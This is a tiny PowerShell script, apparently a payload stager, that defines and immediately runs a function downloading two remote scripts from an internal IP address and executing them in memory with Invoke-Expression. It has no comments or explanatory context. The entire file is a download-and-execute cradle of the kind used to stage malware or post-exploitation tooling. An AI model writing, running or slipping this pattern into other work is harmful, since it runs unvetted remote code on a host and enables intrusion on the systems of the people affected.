function load_init
{
	iex(new-object net.webclient).downloadString('http://192.168.252.5/s2.ps1')
	iex(new-object net.webclient).downloadString('http://192.168.252.5/s3.ps1')
}
load_init



